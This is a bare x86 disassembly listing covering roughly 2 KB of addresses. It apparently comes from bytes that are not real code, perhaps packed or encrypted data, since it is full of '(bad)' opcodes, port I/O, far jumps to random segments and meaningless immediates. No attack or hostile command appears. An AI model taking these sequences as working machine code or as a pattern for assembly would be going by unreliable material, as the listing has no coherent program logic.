  416e5a:	int3   
  416e5b:	test   DWORD PTR [esp+esi*8+0x4d],ebp
  416e5f:	mov    cl,0x46
  416e61:	sbb    BYTE PTR [ecx-0x134aecfe],ch
  416e67:	push   ebx
  416e68:	lods   al,BYTE PTR ds:[esi]
  416e69:	pop    esp
  416e6a:	and    eax,0x173d39c9
  416e6f:	push   ds
  416e70:	cmp    al,0xf
  416e72:	test   ch,cl
  416e74:	test   DWORD PTR gs:[ecx+0x62a092c2],edi
  416e7b:	dec    edx
  416e7c:	sub    edi,DWORD PTR [esi+0x2a]
  416e7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416e80:	dec    ebp
  416e81:	xor    cl,BYTE PTR [esi]
  416e83:	mov    WORD PTR [edx+0x7922b402],cs
  416e89:	imul   esp,DWORD PTR [ecx+0x4de920cf],0x29a19b7
  416e93:	mov    ecx,0x913bc6dc
  416e98:	test   DWORD PTR [ecx+ebp*4+0x2be7085a],eax
  416e9f:	jo     0x416ebc
  416ea1:	or     esi,DWORD PTR [ecx+0xa]
  416ea4:	add    DWORD PTR [edi+edx*1],0xb2b1a415
  416eab:	test   esp,esp
  416ead:	mov    edi,0xc2bf6b1e
  416eb2:	and    dh,bl
  416eb4:	inc    edi
  416eb5:	or     bh,BYTE PTR [ecx+0x5740b20a]
  416ebb:	sub    ah,BYTE PTR [esi+eax*4-0xbae4f1e]
  416ec2:	sbb    ebx,DWORD PTR cs:[edi]
  416ec5:	bound  esp,QWORD PTR [ecx-0x7f85268]
  416ecb:	mov    DWORD PTR [edi-0x6f],ecx
  416ece:	push   ds
  416ecf:	out    dx,al
  416ed0:	dec    esi
  416ed1:	imul   ebx,DWORD PTR [ebx],0x1b
  416ed4:	xlat   BYTE PTR ds:[ebx]
  416ed5:	lods   al,BYTE PTR ds:[esi]
  416ed6:	imul   edx,ebp,0xaa3182c4
  416edc:	test   DWORD PTR [ecx],ecx
  416ede:	mov    ecx,0x677ae058
  416ee3:	repz jmp 0x6338:0x2834e0bd
  416eeb:	into   
  416eec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416eed:	ja     0x416f5e
  416eef:	mov    ah,0xa2
  416ef1:	loop   0x416e82
  416ef3:	call   0xd7d6:0x2d9fd0a9
  416efa:	or     DWORD PTR [ebx+ebp*1-0x54],esi
  416efe:	sub    ch,BYTE PTR ds:0xb3d5d0d3
  416f04:	clc    
  416f05:	push   cs
  416f06:	push   ecx
  416f07:	ret    
  416f08:	and    BYTE PTR [eax-0x218668e6],dl
  416f0e:	pushf  
  416f0f:	js     0x416f80
  416f11:	sub    eax,0xa5486d5e
  416f16:	jbe    0x416f55
  416f18:	push   ebp
  416f19:	test   DWORD PTR [edx+0xefeaec4],0xad587b3f
  416f23:	adc    ebx,DWORD PTR [ebx]
  416f25:	inc    eax
  416f26:	mov    ss,WORD PTR [edi]
  416f28:	inc    ebp
  416f29:	cmp    ebx,DWORD PTR [ebx]
  416f2b:	test   ecx,eax
  416f2d:	(bad)  
  416f2e:	in     eax,0x74
  416f30:	aam    0xb7
  416f32:	test   al,0x7d
  416f34:	xchg   ebx,eax
  416f35:	xor    al,0x77
  416f37:	sub    ebx,DWORD PTR [ebp-0x4e7bf22e]
  416f3d:	adc    eax,0xb6bfee61
  416f42:	clc    
  416f43:	sub    eax,0xc15e64d8
  416f48:	rcl    DWORD PTR [ebx-0x2],0xaf
  416f4c:	xor    eax,0x99d5de7d
  416f51:	xor    ch,0xbb
  416f54:	xchg   ebp,eax
  416f55:	add    al,0x97
  416f57:	inc    ebx
  416f58:	imul   ebx,DWORD PTR [esi+0x6c],0x67ac4654
  416f5f:	jp     0x416f93
  416f61:	sbb    cl,BYTE PTR [eax+ebp*8+0x49]
  416f65:	stc    
  416f66:	xchg   ebp,eax
  416f67:	call   0xeb8d:0x5033abbd
  416f6e:	xlat   BYTE PTR ds:[ebx]
  416f6f:	pop    edx
  416f70:	or     al,0x6b
  416f72:	(bad)  
  416f73:	std    
  416f74:	adc    bl,ah
  416f76:	inc    edx
  416f77:	inc    bx
  416f79:	sub    BYTE PTR [esi+0x30795742],0xf2
  416f80:	daa    
  416f81:	cmp    ah,bl
  416f83:	addr16 cdq 
  416f85:	push   0xffffffc1
  416f87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416f88:	xor    eax,0x9c473a8b
  416f8d:	aaa    
  416f8e:	adc    edi,DWORD PTR [eax+0x15bcdc54]
  416f94:	pop    edx
  416f95:	sbb    BYTE PTR [ebx+0x40],dl
  416f98:	retf   
  416f99:	sbb    DWORD PTR [ecx-0x595b2431],ebx
  416f9f:	(bad)  
  416fa0:	dec    eax
  416fa1:	jmp    0x416fb1
  416fa3:	in     eax,0x12
  416fa5:	sbb    eax,0xec227aab
  416faa:	in     al,dx
  416fab:	pop    ss
  416fac:	cmp    DWORD PTR [edx-0x60],0x8fe079f8
  416fb3:	mov    ebp,0x172f0a0a
  416fb8:	mov    ecx,0xa97a4df9
  416fbd:	ret    0xd028
  416fc0:	sub    cl,BYTE PTR [ebp+eiz*4-0x42a84a81]
  416fc7:	mov    ds:0xf56bf445,eax
  416fcc:	add    bh,BYTE PTR [ebx-0xf9cad83]
  416fd2:	jns    0x41701c
  416fd4:	jmp    0x416ff4
  416fd6:	shr    ah,0xbd
  416fd9:	dec    esi
  416fda:	out    dx,al
  416fdb:	out    0x4a,eax
  416fdd:	xchg   esp,eax
  416fde:	jmp    0x7cae452d
  416fe3:	mov    ebp,DWORD PTR [edi]
  416fe5:	push   es
  416fe6:	outs   dx,BYTE PTR ds:[esi]
  416fe7:	mov    al,0xc1
  416fe9:	jnp    0x416fb1
  416feb:	aam    0x6e
  416fed:	push   0xeb512401
  416ff2:	(bad)  
  416ff3:	jno    0x416fea
  416ff5:	imul   edx,esp,0xe3382293
  416ffb:	outs   dx,DWORD PTR ds:[esi]
  416ffc:	jb     0x417053
  416ffe:	xchg   esp,eax
  416fff:	adc    BYTE PTR [edx+ebx*1+0x7c],0x57
  417004:	call   0xd840:0x90cf1791
  41700b:	mov    ds:0xf1267668,eax
  417010:	imul   eax,DWORD PTR [edx+0x5],0x3b
  417014:	imul   esi,DWORD PTR [ebx+esi*4],0x8f26a83b
  41701b:	mov    al,BYTE PTR [edi]
  41701d:	cld    
  41701e:	add    eax,ecx
  417020:	or     edi,DWORD PTR [ecx+0x45]
  417023:	add    al,0x92
  417025:	mov    eax,0x52c5a590
  41702a:	fwait
  41702b:	cdq    
  41702c:	cmp    al,0xb0
  41702e:	push   edx
  41702f:	jo     0x417092
  417031:	les    esi,FWORD PTR [edx-0x1e]
  417034:	and    dl,BYTE PTR [eax-0x22]
  417037:	adc    ebp,ebp
  417039:	call   0xf0a0fe7b
  41703e:	push   0xe7b011f5
  417043:	cmp    BYTE PTR [ebp+0x28],0x0
  417047:	out    0xa9,al
  417049:	push   cs
  41704a:	loop   0x417028
  41704c:	fcom   QWORD PTR [eax]
  41704e:	adc    ecx,ebp
  417050:	pop    esp
  417051:	mov    ah,0xec
  417053:	sbb    al,0xe2
  417055:	adc    ebp,DWORD PTR [edx+0x4]
  417058:	mov    ch,0xec
  41705a:	fisttp WORD PTR [eax]
  41705c:	pop    edx
  41705d:	cmc    
  41705e:	sub    BYTE PTR [esi-0x143af634],al
  417064:	inc    edi
  417065:	inc    eax
  417066:	loopne 0x4170b2
  417068:	nop
  417069:	fwait
  41706a:	call   FWORD PTR [ebx+0x27]
  41706d:	pop    ds
  41706e:	dec    BYTE PTR [esi+eax*8+0x1a]
  417072:	fimul  DWORD PTR [edx-0x42]
  417075:	jns    0x417095
  417077:	loope  0x417076
  417079:	push   cs
  41707a:	jb     0x41700e
  41707c:	lahf   
  41707d:	jg     0x4170ea
  41707f:	ins    BYTE PTR es:[edi],dx
  417080:	into   
  417081:	or     al,BYTE PTR [edx+0x4be3b1c1]
  417087:	into   
  417088:	loop   0x4170fc
  41708a:	xor    al,0x6e
  41708c:	ins    BYTE PTR es:[edi],dx
  41708d:	rcl    BYTE PTR ds:0xb0fcb1f,1
  417093:	pop    eax
  417094:	enter  0x92db,0x54
  417098:	stos   BYTE PTR es:[edi],al
  417099:	ret    0x7f2d
  41709c:	data16 mov dh,0xab
  41709f:	mov    edx,0xf60e37ef
  4170a4:	mov    al,ds:0xb864d1a5
  4170a9:	sub    BYTE PTR [edx+0x7],al
  4170ac:	dec    eax
  4170ad:	and    BYTE PTR cs:[ecx+0x33],al
  4170b1:	add    esp,DWORD PTR [esp+eiz*4+0x329b845d]
  4170b8:	add    DWORD PTR [esp+eax*4],ebp
  4170bb:	pushf  
  4170bc:	jle    0x417070
  4170be:	sbb    al,0xf5
  4170c0:	jecxz  0x4170e1
  4170c2:	mov    BYTE PTR [ecx-0x76],0xfb
  4170c6:	xor    al,BYTE PTR [ebp+0x7d]
  4170c9:	pop    ss
  4170ca:	push   eax
  4170cb:	and    ecx,ecx
  4170cd:	leave  
  4170ce:	retf   
  4170cf:	loopne 0x417061
  4170d1:	rol    BYTE PTR [edi],1
  4170d3:	dec    edx
  4170d4:	leave  
  4170d5:	mov    cl,0xd1
  4170d7:	push   ebx
  4170d8:	cmp    bl,bl
  4170da:	out    dx,al
  4170db:	mov    bl,0x21
  4170dd:	pop    es
  4170de:	les    ebp,FWORD PTR [edi]
  4170e0:	cs (bad) 
  4170e2:	or     eax,esi
  4170e4:	fistp  QWORD PTR [edx-0x11]
  4170e7:	add    bh,dl
  4170e9:	cwde   
  4170ea:	fisubr WORD PTR [esi-0x2dec5b66]
  4170f0:	jle    0x41714d
  4170f2:	fistp  DWORD PTR [ecx]
  4170f4:	or     eax,0x2246242
  4170f9:	or     al,0xee
  4170fb:	inc    eax
  4170fc:	les    edi,FWORD PTR [esi-0x745ea918]
  417102:	push   es
  417103:	pushf  
  417104:	jp     0x4170a5
  417106:	xor    eax,0xd1e6db
  41710b:	test   bh,bh
  41710d:	jne    0x417118
  41710f:	jl     0x41713c
  417111:	pop    esi
  417112:	addr16 cmp eax,edi
  417115:	out    dx,al
  417116:	outs   dx,DWORD PTR ds:[esi]
  417117:	cld    
  417118:	push   0x46
  41711a:	dec    esp
  41711b:	xchg   ebp,eax
  41711c:	pop    eax
  41711d:	push   0x50080df9
  417122:	mov    gs,edi
  417124:	jns    0x4170f8
  417126:	and    DWORD PTR [ebx],0x3a6e0bc8
  41712c:	add    BYTE PTR [edx+0x7ec8de1a],0xa8
  417133:	leave  
  417134:	cmovae ecx,edx
  417137:	aaa    
  417138:	or     al,0x26
  41713a:	out    dx,al
  41713b:	and    al,0xfd
  41713d:	mov    ah,0xaa
  41713f:	cs mov eax,0x50791528
  417145:	pop    edx
  417146:	shr    BYTE PTR [edi],0xcd
  417149:	dec    ebp
  41714a:	mov    edi,0x273dfa3a
  41714f:	cld    
  417150:	or     ah,BYTE PTR [edi-0x60]
  417153:	icebp  
  417154:	sub    DWORD PTR [edi],0x5c44b41f
  41715a:	into   
  41715b:	pop    eax
  41715c:	(bad)  
  41715d:	sub    cl,ch
  41715f:	imul   esp,DWORD PTR [edx+0xc6144b8],0x7cc5f187
  417169:	cmp    dh,BYTE PTR [esi-0x50eb23d5]
  41716f:	and    esi,ebp
  417171:	hlt    
  417172:	sbb    DWORD PTR [edx],edi
  417174:	popf   
  417175:	sub    eax,0xd0ade1d1
  41717a:	and    ah,BYTE PTR ds:0xbd68605
  417180:	in     al,dx
  417181:	(bad)  [edx]
  417183:	lahf   
  417184:	nop
  417185:	cmp    eax,0x6996d7a9
  41718a:	add    bh,BYTE PTR [esi-0x57]
  41718d:	fwait
  41718e:	je     0x4171e6
  417190:	js     0x4171f2
  417192:	or     ch,BYTE PTR [ebp+0x7e]
  417195:	aam    0x37
  417197:	imul   ecx,DWORD PTR [eax+0x7e],0x26
  41719b:	loop   0x417158
  41719d:	push   edx
  41719e:	pop    edx
  41719f:	shl    BYTE PTR [ecx-0x13],1
  4171a2:	pop    edi
  4171a3:	xchg   BYTE PTR [ebx+ecx*4-0x6cc52277],bl
  4171aa:	pop    ecx
  4171ab:	ds mov eax,0xb0130872
  4171b1:	jmp    0xca0c:0xdb4b6dec
  4171b8:	mov    al,ds:0x8f0e53c4
  4171bd:	cwde   
  4171be:	imul   edi,DWORD PTR [esi+0xeaa5831],0xa0a903b2
  4171c8:	sub    edx,DWORD PTR [edx]
  4171ca:	jecxz  0x417163
  4171cc:	mov    eax,0x2fb12530
  4171d1:	shl    DWORD PTR [ebx-0x5c2ee78],1
  4171d7:	jns    0x417218
  4171d9:	push   ss
  4171da:	sar    DWORD PTR [edi-0x33],cl
  4171dd:	out    dx,al
  4171de:	leave  
  4171df:	inc    ebp
  4171e0:	scas   eax,DWORD PTR es:[edi]
  4171e1:	mov    ds:0x352b296e,al
  4171e6:	aaa    
  4171e7:	add    eax,0x45033869
  4171ec:	fucomi st,st(7)
  4171ee:	cdq    
  4171ef:	mov    ds:0xd89fc05,al
  4171f4:	pop    edx
  4171f5:	pop    ss
  4171f6:	add    esi,esi
  4171f8:	mov    ebx,0xd96d3c88
  4171fd:	fistp  QWORD PTR [esi-0x1a6305e5]
  417203:	push   ebp
  417204:	adc    DWORD PTR ds:0xc1991a6f,esi
  41720a:	mov    cl,0x95
  41720c:	and    BYTE PTR [esi+eax*1+0xd],bh
  417210:	adc    al,dh
  417212:	cmp    DWORD PTR [ebp-0x1461e326],esi
  417218:	bound  eax,QWORD PTR [esi-0x12]
  41721b:	sub    DWORD PTR [edx-0x6a],esp
  41721e:	es inc edx
  417220:	cmp    BYTE PTR [eax],ch
  417222:	adc    bl,BYTE PTR [ebx-0x30956274]
  417228:	cmp    eax,DWORD PTR ds:0x7e4cc80d
  41722e:	xor    eax,DWORD PTR [ecx]
  417230:	mov    al,0xf7
  417232:	sti    
  417233:	int    0xf6
  417235:	out    dx,eax
  417236:	es pop esi
  417238:	sbb    DWORD PTR [ebx-0x5b],esi
  41723b:	fnstsw WORD PTR [edi-0x73]
  41723e:	ja     0x41727b
  417240:	cmc    
  417241:	scas   al,BYTE PTR es:[edi]
  417242:	mov    ch,0x58
  417244:	inc    ecx
  417245:	mov    ch,0x43
  417247:	loope  0x417294
  417249:	jmp    0x5f067b69
  41724e:	scas   al,BYTE PTR es:[edi]
  41724f:	(bad)  
  417251:	ins    DWORD PTR es:[edi],dx
  417252:	enter  0x9a1c,0x8d
  417256:	call   0xa1f947f
  41725b:	dec    ecx
  41725c:	call   0xd659613f
  417261:	bound  ecx,QWORD PTR [ecx+0x35]
  417264:	dec    ebp
  417265:	into   
  417266:	push   ebp
  417267:	mov    dl,0x4a
  417269:	fwait
  41726a:	inc    eax
  41726b:	ds sub eax,0x71ea3f32
  417271:	push   0x1da9d543
  417276:	dec    ecx
  417277:	call   0x7c06:0x4ea77b19
  41727e:	scas   al,BYTE PTR es:[edi]
  41727f:	jl     0x4172d2
  417281:	pop    eax
  417282:	sub    al,BYTE PTR [edx]
  417284:	jle    0x417278
  417286:	(bad)  
  417287:	xor    dh,dh
  417289:	popa   
  41728a:	add    bh,0xf
  41728d:	ret    0x2ea3
  417290:	xor    eax,0xdfd4d21b
  417295:	in     al,dx
  417296:	ins    BYTE PTR es:[edi],dx
  417297:	and    eax,0xd6fa02b8
  41729c:	and    al,BYTE PTR [ebp-0x23]
  41729f:	dec    esp
  4172a0:	mov    edx,0x13b7649f
  4172a5:	jge    0x417259
  4172a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4172a8:	arpl   WORD PTR [esp+edi*4],cx
  4172ab:	(bad)
  4172ae:	pop    eax
  4172af:	mov    WORD PTR [edi-0x2930516],fs
  4172b5:	inc    eax
  4172b6:	add    al,dh
  4172b8:	mov    ch,0x66
  4172ba:	sbb    eax,0x532d4df6
  4172bf:	and    ebp,DWORD PTR [ebp-0x579af9fb]
  4172c5:	xchg   esi,eax
  4172c6:	mov    bl,0xe4
  4172c8:	test   al,0x6f
  4172ca:	sar    BYTE PTR [eax-0x69447c57],0x93
  4172d1:	inc    ebx
  4172d2:	outs   dx,DWORD PTR ds:[esi]
  4172d3:	inc    esp
  4172d4:	xor    DWORD PTR [esi+0x52d9aee5],ecx
  4172da:	fwait
  4172db:	loopne 0x4172f3
  4172dd:	adc    BYTE PTR [ecx-0x58],dl
  4172e0:	mov    ebx,0x41dd130e
  4172e5:	and    al,BYTE PTR [edi]
  4172e7:	test   BYTE PTR [ecx],al
  4172e9:	mov    cl,0xcc
  4172eb:	mov    esi,DWORD PTR [eax+0x4da9d41e]
  4172f1:	ja     0x417337
  4172f3:	add    al,0xc2
  4172f5:	sub    dl,BYTE PTR [edx-0x37]
  4172f8:	jb     0x4172ed
  4172fa:	out    0xe1,eax
  4172fc:	(bad)  
  4172fe:	dec    esi
  4172ff:	xchg   edx,eax
  417300:	fs jmp 0x818c:0x977a418f
  417308:	cli    
  417309:	stos   DWORD PTR es:[edi],eax
  41730a:	mov    ds:0x6c2be424,eax
  41730f:	hlt    
  417310:	pop    ecx
  417311:	add    ebp,ebx
  417313:	jge    0x4172f9
  417315:	imul   ebp,DWORD PTR [edi],0xf77795d2
  41731b:	out    dx,eax
  41731c:	out    0x81,al
  41731e:	pop    es
  41731f:	inc    edx
  417320:	adc    al,0xc
  417322:	mov    BYTE PTR [edx+0x47],al
  417325:	cmp    DWORD PTR [ecx+0xfcd3303],ebx
  41732b:	xchg   edi,eax
  41732c:	jb     0x41735c
  41732e:	jg     0x4172ce
  417330:	xchg   dh,bh
  417332:	fucomp st(0)
  417334:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417335:	imul   edx,DWORD PTR [ebx+0x76],0x33ba33c9
  41733c:	shl    DWORD PTR [ecx],1
  41733e:	mov    al,0xe6
  417340:	adc    eax,0x6039a042
  417345:	lods   al,BYTE PTR ds:[esi]
  417346:	(bad)  
  417347:	mov    ecx,0xfa3eb7b9
  41734c:	nop
  41734d:	sub    eax,0xf58e791
  417352:	test   al,0x14
  417354:	mov    esi,DWORD PTR [esi-0x22]
  417357:	sahf   
  417358:	jae    0x417333
  41735a:	or     DWORD PTR [edi],esp
  41735c:	in     al,0xf4
  41735e:	(bad)  
  417360:	bound  ebp,QWORD PTR [eax+0x16e42465]
  417366:	pop    ecx
  417367:	push   cs
  417368:	adc    al,0xb8
  41736a:	and    edx,DWORD PTR [ecx]
  41736c:	sbb    ebp,DWORD PTR [esi]
  41736e:	pop    edi
  41736f:	fadd   DWORD PTR [ebp+0x7ff57afa]
  417375:	icebp  
  417376:	(bad)  
  417377:	test   al,0xa1
  417379:	jno    0x417379
  41737b:	ja     0x4173f7
  41737d:	nop
  41737e:	add    cl,dl
  417380:	ret    
  417381:	or     eax,0x2d2c3f9
  417386:	cdq    
  417387:	popa   
  417388:	test   eax,0xb7ea1415
  41738d:	in     al,dx
  41738e:	icebp  
  41738f:	xchg   ebx,eax
  417390:	(bad)
  417393:	pop    edi
  417394:	dec    ecx
  417395:	and    eax,0xfa1f0609
  41739a:	clc    
  41739b:	test   al,0xce
  41739d:	dec    ebx
  41739e:	jg     0x417385
  4173a0:	fsubp  st(0),st
  4173a2:	mov    edx,0x5b504185
  4173a7:	shl    BYTE PTR [edi-0x48],cl
  4173aa:	xor    bh,BYTE PTR [eax+0x49a3996d]
  4173b0:	sahf   
  4173b1:	xor    eax,0xfdeca590
  4173b6:	stos   BYTE PTR es:[edi],al
  4173b7:	jmp    0x6d29:0xc40191fa
  4173be:	push   ebx
  4173bf:	jg     0x417349
  4173c1:	inc    ecx
  4173c2:	scas   al,BYTE PTR es:[edi]
  4173c3:	cs je  0x417361
  4173c6:	dec    edx
  4173c7:	std    
  4173c8:	add    eax,0x306be8
  4173cd:	scas   eax,DWORD PTR es:[edi]
  4173ce:	cmp    eax,0xcca8484a
  4173d3:	pop    esi
  4173d4:	push   esp
  4173d5:	jecxz  0x41737a
  4173d7:	fild   WORD PTR [esi+0x72]
  4173da:	xor    ch,BYTE PTR [edx-0x36]
  4173dd:	push   ss
  4173de:	jle    0x41743c
  4173e0:	bound  ebp,QWORD PTR [eax-0x39977eff]
  4173e6:	inc    ecx
  4173e7:	sbb    eax,0xb8705874
  4173ec:	mov    ecx,0xb9e0040f
  4173f1:	adc    BYTE PTR [esi],ch
  4173f3:	and    ch,BYTE PTR [ecx+0x2f45f1b]
  4173f9:	js     0x417431
  4173fb:	adc    esi,DWORD PTR [ebx-0x64]
  4173fe:	call   0x3896:0x97643561
  417405:	mov    ds:0x7fef57c3,al
  41740a:	out    dx,al
  41740b:	loopne 0x4173c9
  41740d:	stc    
  41740e:	jne    0x41744f
  417410:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417411:	xchg   edi,eax
  417412:	mov    edi,0x60cf23eb
  417417:	mov    eax,ds:0xbeb36834
  41741c:	xchg   ecx,eax
  41741d:	jecxz  0x417488
  41741f:	fnsave [eax-0x290c76b1]
  417425:	adc    eax,0x652e2916
  41742a:	(bad)  
  41742b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41742d:	stc    
  41742e:	call   0xa47f:0xd3998395
  417435:	mov    ebp,DWORD PTR [ebp+0x3b697b7d]
  41743b:	add    al,0x14
  41743d:	adc    DWORD PTR [esi-0x38fa7ca2],ecx
  417443:	pop    esp
  417444:	imul   eax,DWORD PTR [edx],0x1c7669df
  41744a:	test   BYTE PTR [ebx-0x547f8fd3],al
  417450:	mul    DWORD PTR [ebx+0x5c086d10]
  417456:	cmc    
  417457:	rol    BYTE PTR [ebx+edi*1],1
  41745a:	add    eax,0x81e642aa
  41745f:	cmp    eax,0xaef36570
  417464:	adc    dh,BYTE PTR [edi]
  417466:	sbb    ebp,eax
  417468:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417469:	je     0x4174d3
  41746b:	out    0xc6,eax
  41746d:	ja     0x4174a5
  41746f:	mov    esi,0x1dabdad3
  417474:	in     al,0x72
  417476:	aas    
  417477:	sub    ebp,esp
  417479:	dec    ecx
  41747a:	ins    DWORD PTR es:[edi],dx
  41747b:	mov    esi,0x3bd409c0
  417480:	cmc    
  417481:	ffreep st(3)
  417483:	and    BYTE PTR [ecx-0x5],0xbe
  417487:	retf   0x8efc
  41748a:	std    
  41748b:	idiv   DWORD PTR [ebx+ecx*1-0x47]
  41748f:	push   ebx
  417490:	pop    ebx
  417491:	push   edi
  417492:	add    eax,0xb4ac970d
  417497:	mov    edi,0x7194ac65
  41749c:	loope  0x417505
  41749e:	enter  0x717c,0x73
  4174a2:	adc    DWORD PTR [ecx+ebx*4-0x4],eax
  4174a6:	mov    ebp,0x871c2203
  4174ab:	mov    eax,?
  4174ad:	je     0x417463
  4174af:	stos   DWORD PTR es:[edi],eax
  4174b0:	xchg   DWORD PTR [edx],ecx
  4174b2:	inc    ebx
  4174b3:	mov    cl,0x94
  4174b5:	add    BYTE PTR [ebp-0x53e78a81],bh
  4174bb:	dec    esp
  4174bc:	push   0x87ab7f58
  4174c1:	ficom  DWORD PTR [eax+esi*1]
  4174c4:	add    eax,DWORD PTR [esi-0x594ef344]
  4174ca:	ror    dh,cl
  4174cc:	dec    ebp
  4174cd:	xchg   ecx,eax
  4174ce:	push   0x73
  4174d0:	mov    DWORD PTR [ebp-0x7e],esi
  4174d3:	jg     0x4174f2
  4174d5:	pop    eax
  4174d6:	leave  
  4174d7:	pop    eax
  4174d8:	mov    DWORD PTR [ecx],ebx
  4174da:	stos   DWORD PTR es:[edi],eax
  4174db:	sub    eax,0x54df119d
  4174e0:	out    0x64,eax
  4174e2:	sub    esp,ebp
  4174e4:	dec    edx
  4174e5:	add    edi,DWORD PTR [edi+edx*4+0x6ac6829]
  4174ec:	inc    esp
  4174ed:	add    edi,edi
  4174ef:	sbb    al,0xcc
  4174f1:	fild   WORD PTR [esi+0x64b14117]
  4174f7:	push   esi
  4174f8:	loopne 0x417515
  4174fa:	dec    edx
  4174fb:	jmp    0xc19fbfad
  417500:	sub    eax,0x7eae3fd6
  417505:	rcr    DWORD PTR [ebx],1
  417507:	sti    
  417508:	jbe    0x417506
  41750a:	mov    eax,0xc9bca0ab
  41750f:	rol    cl,cl
  417511:	out    dx,al
  417512:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417513:	fwait
  417514:	xor    bh,0x1c
  417517:	out    dx,eax
  417518:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417519:	aam    0x68
  41751b:	jno    0x417596
  41751d:	sub    eax,0x89830521
  417522:	cmp    al,BYTE PTR [ecx-0x7]
  417525:	test   eax,0x11b1a12c
  41752a:	out    dx,al
  41752b:	push   eax
  41752c:	cwde   
  41752d:	cli    
  41752e:	xchg   BYTE PTR [ebx+0x6e],bl
  417531:	js     0x4175ab
  417533:	push   esi
  417534:	and    DWORD PTR [eax+0x57],ebx
  417537:	pop    ecx
  417538:	push   edi
  417539:	mov    ds:0x912d0192,eax
  41753e:	jns    0x4174c8
  417540:	pop    ss
  417541:	jg     0x41759d
  417543:	mov    ch,0x4a
  417545:	xchg   edi,eax
  417546:	adc    ecx,DWORD PTR [ecx-0xd0e6cfc]
  41754c:	out    0x4d,al
  41754e:	cwde   
  41754f:	xchg   esi,eax
  417550:	mov    bh,0xff
  417552:	inc    edi
  417553:	dec    esp
  417554:	imul   ebx,DWORD PTR [esi],0x9062f4d7
  41755a:	scas   al,BYTE PTR es:[edi]
  41755b:	call   0x7fbfa385
  417560:	shl    BYTE PTR [esp+ecx*2+0x852adaf],1
  417567:	sar    BYTE PTR [esi],0x82
  41756a:	inc    ecx
  41756b:	dec    esp
  41756c:	push   ebx
  41756d:	clc    
  41756e:	push   eax
  41756f:	lahf   
  417570:	or     eax,0x42f7327
  417575:	ins    DWORD PTR es:[edi],dx
  417576:	dec    ebp
  417577:	pop    ss
  417578:	push   ds
  417579:	mov    eax,0xb0d686fb
  41757e:	push   ebx
  41757f:	retf   
  417580:	inc    eax
  417581:	loopne 0x417550
  417583:	mov    dh,0x52
  417585:	xchg   esp,eax
  417586:	out    0xb8,al
  417588:	xor    al,BYTE PTR [ecx-0x3d]
  41758b:	push   edx
  41758c:	mov    eax,0x2d07e5a9
  417591:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417592:	inc    edi
  417593:	adc    ebx,ebx
  417595:	xor    eax,0x8be95c01
  41759a:	inc    ebx
  41759b:	ja     0x417520
  41759d:	sbb    esp,DWORD PTR [eax+0x13]
  4175a0:	nop
  4175a1:	jo     0x41755c
  4175a3:	push   0x4c
  4175a5:	outs   dx,BYTE PTR ds:[esi]
  4175a6:	mov    esi,0xb2ea087c
  4175ab:	mov    WORD PTR [eax],ss
  4175ad:	xor    al,0xfc
  4175af:	repnz xlat BYTE PTR ds:[ebx]
  4175b1:	add    BYTE PTR [ebx+edx*8+0x6ff7bafb],cl
  4175b8:	push   cs
  4175b9:	dec    eax
  4175ba:	and    eax,DWORD PTR [ecx+ecx*8-0x768fcb3c]
  4175c1:	pushf  
  4175c2:	lods   al,BYTE PTR ds:[esi]
  4175c3:	xchg   ebp,eax
  4175c4:	jnp    0x4175c8
  4175c6:	push   esi
  4175c7:	jns    0x417583
  4175c9:	push   edx
  4175ca:	dec    ecx
  4175cb:	mov    dl,0x51
  4175cd:	add    edx,DWORD PTR [edi-0x66]
  4175d0:	cwde   
  4175d1:	mov    es,WORD PTR es:[eax-0x7b]
  4175d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4175d6:	ss mov ebx,DWORD PTR cs:[edx+0x5d]
  4175db:	and    al,BYTE PTR [esi+0x7741edcf]
  4175e1:	jno    0x4175b1
  4175e3:	das    
  4175e4:	es adc eax,edx
  4175e7:	stos   DWORD PTR es:[edi],eax
  4175e8:	repz add ebx,eax
  4175eb:	repz (bad) 
  4175ed:	mov    eax,ds:0x60da0a4b
  4175f2:	dec    ebx
  4175f3:	jmp    0x7705:0x9fab6eb7
  4175fa:	test   al,0x39
  4175fc:	sub    esi,DWORD PTR [esi]
  4175fe:	and    DWORD PTR [ebp+0x502e00db],eax
  417604:	call   0x3b3b:0x78f3304a
  41760b:	ja     0x4175ae
  41760d:	mov    ecx,edx
  41760f:	inc    ebp
  417610:	xor    ebp,edi
  417612:	inc    eax
  417613:	dec    esp
  417614:	aam    0xc0
  417616:	pop    ebp
  417617:	pop    ebx
  417618:	mov    ah,0x17
  41761a:	push   ebx
  41761b:	mov    ah,0xf5
  41761d:	or     BYTE PTR [edx+0x63],bl
  417620:	ret    0xaf1f
  417623:	ret    
  417624:	scas   al,BYTE PTR es:[edi]
  417625:	leave  
  417626:	mov    dl,0x8e
  417628:	popa   
  417629:	cmp    bh,0x78
  41762c:	bound  ecx,QWORD PTR [edx]
  41762e:	clc    
  41762f:	dec    edi
  417630:	clc    
  417631:	pusha  
  417632:	int3   
  417633:	mov    DWORD PTR [esi+0x7aed9657],edi
  417639:	inc    esp
  41763a:	add    al,0xd8
  41763c:	ins    BYTE PTR es:[edi],dx
  41763d:	mov    ah,0x36
  41763f:	push   esp
  417640:	xchg   ecx,eax
  417641:	mov    eax,DWORD PTR [ebp+0x0]
  417644:	xchg   esp,eax
  417645:	mov    ds:0x451a765d,eax
  41764a:	push   ss
  41764b:	dec    ebx
  41764c:	into   
  41764d:	rcr    al,1
  41764f:	mov    BYTE PTR [ecx+0x340fbd72],dl
  417655:	dec    ecx
  417656:	add    al,0x26
  417658:	hlt    
  417659:	fistp  WORD PTR [ebx+0x24637ea9]
  41765f:	mov    ebp,0x3bc6d0
  417664:	ins    BYTE PTR es:[edi],dx
  417665:	pop    ecx
  417666:	sbb    DWORD PTR [edx+0x29],esi
  417669:	jle    0x4176a9
  41766b:	stos   DWORD PTR es:[edi],eax
  41766c:	out    dx,eax
